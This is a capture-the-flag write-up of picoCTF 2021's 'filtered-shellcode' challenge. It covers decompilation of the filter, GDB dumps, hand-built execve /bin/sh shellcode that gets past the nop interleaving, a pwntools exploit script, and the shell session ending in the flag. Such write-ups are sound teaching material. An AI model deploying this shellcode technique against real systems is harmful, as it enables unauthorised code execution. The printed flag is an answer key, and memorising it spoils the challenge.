---
layout: post
title: Filtered shellcode ? - picoCTF 2021 filtered-shellcode
tags: [CTF, pwn]
---
> A program that just runs the code you give it? That seems kinda boring... [fun](https://mercury.picoctf.net/static/0bfc0f68ad29f38974f990c78e45977e/fun) nc mercury.picoctf.net 40525
>
> Hint: Take a look at the calling convention and see how you might be able to setup all the registers

## Ghidra
The `main` function takes input and then calls `execute` function which will do the filtering and execute the filtered input.
```c
void execute(char *code,int len)

{
  uint zero;
  undefined4 __;
  undefined new_code [8];
  undefined *local_24;
  undefined *local_20;
  uint _;
  uint double_len;
  int code_idx_;
  uint i;
  int code_idx;
  int offset;
  
  __ = 0x8048502;
  if ((code != (char *)0x0) && (len != 0)) {
    double_len = len * 2;
    _ = double_len;
    offset = ((double_len + 0x10) / 0x10) * -0x10;
    local_20 = new_code + offset;
    code_idx_ = 0;
    for (i = 0; code_idx = code_idx_, i < double_len; i = i + 1) {
      zero = (uint)((int)i >> 0x1f) >> 0x1e;
      if ((int)((i + zero & 3) - zero) < 2) {
        code_idx_ = code_idx_ + 1;
        new_code[i + offset] = code[code_idx];
      }
      else {
        new_code[i + offset] = 0x90;
      }
    }
    new_code[double_len + offset] = 0xc3;
    local_24 = new_code + offset;
    *(undefined4 *)(new_code + offset + -4) = 0x80485cb;
    (*(code *)(new_code + offset))();
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
Some variables are renamed for readability. Our input is divided into 2-byte chunks separated by 2 `nop`s. Actually observing this behavior on GDB seems to be easier.
```
Before:
gef➤  x/8x $eax
0xffffc713:     0x41414141      0x42424242      0x43434343      0x44444444
0xffffc723:     0x000009f7      0x00000000      0x00000400      0xffd5e800

After:
gef➤  x/8x $eax
0xffffc6a0:     0x90904141      0x90904141      0x90904242      0x90904242
0xffffc6b0:     0x90904343      0x90904343      0x90904444      0x90904444
```
So only instructions with opcode up to 2 bytes could be used.

## Attack
Normally a shellcode calling `/bin/sh` via `execve` looks like
```
; push "//bin/sh" onto stack
xor eax, eax
push eax
push `n/sh`
push `//bi`

; prepare parameters for execve
mov ebx, esp
xor ecx, ecx
xor edx, edx

; syscall
mov al, 0x0b
int 0x80
```
But apparently those `push` instructions would break because of the `nop` separator. The solution is to use shift operations and write each character one by one. The following is my solution:
```python
from pwn import *

# shellcode = b"\x31\xC0\x31\xDB\x31\xC9\x31\xD2\xB7\x01\x51\x90\xB0\x68\xF7\xE3\xB0\x73\xF7\xE3\xB0\x2F\xF7\xE3\xB0\x6E\x50\x90\xB0\x69\xF7\xE3\xB0\x62\xF7\xE3\xB0\x2F\xF7\xE3\xB0\x2F\x50\x90\x31\xC0\x89\xE3\x31\xC9\x31\xD2\xB0\x0B\xCD\x80"

shellcode = """
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

/* prepare shift left by 2 bytes */
mov bh, 1

/* string terminator */
push ecx
nop /* padding */

/* n/sh [0x6e, 0x2f, 0x73, 0x68] */
mov al, 0x68
mul ebx
mov al, 0x73
mul ebx
mov al, 0x2f
mul ebx
mov al, 0x6e
push eax
nop /* padding */

/* //bin [0x2f, 0x2f, 0x62, 0x69] */
mov al, 0x69
mul ebx
mov al, 0x62
mul ebx
mov al, 0x2f
mul ebx
mov al, 0x2f
push eax
nop /* padding */

/* prepare syscall */
xor eax, eax
mov al, 0x0b
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
"""

p = remote("mercury.picoctf.net", 40525)
p.recvuntil(b"run:")
p.sendline(asm(shellcode))
p.interactive()
```
I use `mul 0x100` to shift left by 2 bytes at a time. Also there are `nop`s after `push`s for padding (`push` only takes 1 byte).
```
❯ python3 ./solve.py
[+] Opening connection to mercury.picoctf.net on port 40525: Done
[*] Switching to interactive mode

$ ls
flag.txt
fun
fun.c
xinet_startup.sh
$ cat flag.txt
picoCTF{th4t_w4s_fun_5d991c7a5107a414}
```

## Reference
- [https://github.com/apoirrier/CTFs-writeups/blob/master/PicoCTF/Pwn/filtered-shellcode.md](https://github.com/apoirrier/CTFs-writeups/blob/master/PicoCTF/Pwn/filtered-shellcode.md)
- [Chromium OS Docs - Linux System Call Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)